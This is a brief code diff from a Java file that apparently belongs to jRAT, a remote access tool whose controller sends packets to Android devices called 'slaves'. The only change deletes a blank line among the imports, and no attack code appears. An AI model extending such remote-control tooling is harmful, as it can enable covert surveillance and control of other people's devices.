@@ -3,7 +3,6 @@ package io.jrat.controller.packets.android.outgoing;
 import io.jrat.common.PacketRange;
 import io.jrat.controller.addons.PluginEventHandler;
 import io.jrat.controller.android.AndroidSlave;
-
 import java.io.DataOutputStream;
 
 
